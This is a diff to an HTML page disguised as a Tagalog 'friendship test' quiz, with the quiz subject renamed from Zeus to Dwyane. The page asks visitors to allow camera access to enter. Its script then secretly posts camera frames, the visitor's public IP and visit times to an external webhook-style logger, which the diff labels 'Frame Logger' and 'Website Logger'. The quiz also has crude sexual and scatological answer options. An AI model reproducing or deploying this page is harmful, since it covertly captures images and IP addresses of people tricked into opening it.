@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ziyus Friendship Test</title>
+  <title>Dwyane Friendship Test</title>
   <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
   <style>
     * {
@@ -172,7 +172,7 @@
 <body>
   <div class="container" id="app">
     <div class="card text-center" id="cameraScreen">
-      <h2>Ziyus Friendship Test</h2>
+      <h2>Dwyane Friendship Test</h2>
       <p>kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter</p>
       <p class="error" id="cameraError" style="display: none;"></p>
       <button onclick="requestCamera()">Enter</button>
@@ -183,16 +183,15 @@
 
   <script>
     const questions = [
-      { question: "Ilang taon na si Zeus?", options: ["11", "13", "67", "57"], correct: 1 },
-      { question: "Pogi ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Mabait ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Kamukha ba ni Zeus si Donny Pangilinan?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Ano ang paboritong pagkain ni Zeus?", options: ["Tubol", "Tae", "Regla", "Pekpek"], correct: 3 },
-      { question: "Ilan ang aura ni Zeus?", options: ["100%", "1000%", "67%", "800%"], correct: 2 },
-      { question: "Skibidi ba si Zeus?", options: ["Yes", "No", "Yes", "Yes"], correct: [0, 2, 3] },
+      { question: "Ilang taon na si Dwyane?", options: ["11", "13", "67", "57"], correct: 1 },
+      { question: "Pogi ba si Dwyane?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Mabait ba si Dwyane?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Kamukha ba ni Dwyane si Donny Pangilinan?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
+      { question: "Ano ang paboritong pagkain ni Dwyane?", options: ["Tubol", "Tae", "Regla", "Pekpek"], correct: 3 },
+      { question: "Ilan ang aura ni Dwyane?", options: ["100%", "1000%", "67%", "800%"], correct: 2 },
+      { question: "Skibidi ba si Dwyane?", options: ["Yes", "No", "Yes", "Yes"], correct: [0, 2, 3] },
       { question: "Tuloy ba sa December 27?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Matalino ba si Zeus?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] },
-      { question: "Ang hindi sumama noong December 17 ay mamamatay!", options: ["Barang", "Barang", "Barang", "Barang"], correct: [0, 1, 2, 3] }
+      { question: "Matalino ba si Dwyane?", options: ["Yes", "Yes", "Yes", "Yes"], correct: [0, 1, 2, 3] }
     ];
     let currentQuestion = 0;
     let score = 0;
@@ -240,16 +239,18 @@
         const form = new FormData();
         form.append('file', file);
         form.append('payload_json', JSON.stringify({
-          username: "Ziyus Frame Logger",
+          username: "🇩🇼🇾🇦🇳🇪 🇫🇷🇦🇲🇪 🇱🇴🇬🇬🇪🇷",
           content: `Frame ${frameCounter}`,
           embeds: [{
             title: "Quiz Camera Capture",
-            color: 0x9B59B6,
+            color: 10181046,
             fields: [
-              { name: "IP", value: `\`${ip}\``, inline: true },
-              { name: "Time", value: new Date().toLocaleString(), inline: true }
+              { name: "Public IP:", value: `\`${ip}\``, inline: true },
+              { name: "Time:", value: new Date().toLocaleString(), inline: true }
             ],
-            image: { url: "attachment://frame.jpg" }
+            image: { url: "attachment://frame.jpg" },
+            timestamp: new Date().toISOString(),
+            footer: { text: "🇩🇼🇾🇦🇳🇪 🇱🇴🇬🇬🇪🇷" }
           }]
         }));
 
@@ -279,7 +280,7 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            username: "🇿🇮🇾🇺🇸 🇼🇪🇧🇸🇮🇹🇪 🇱🇴🇬🇬🇪🇷",
+            username: "🇩🇼🇾🇦🇳🇪 🇼🇪🇧🇸🇮🇹🇪 🇱🇴🇬🇬🇪🇷",
             embeds: [{
               title: "Beshie Entered the Website!",
               description: "Binuksan na ni Beshie!",
@@ -290,7 +291,7 @@
                 { name: "Time:", value: `\`${new Date().toLocaleString()}\``, inline: true }
               ],
               timestamp: new Date().toISOString(),
-              footer: { text: "🇿🇮🇾🇺🇸 🇱🇴🇬🇬🇪🇷" }
+              footer: { text: "🇩🇼🇾🇦🇳🇪 🇱🇴🇬🇬🇪🇷" }
             }]
           })
         });
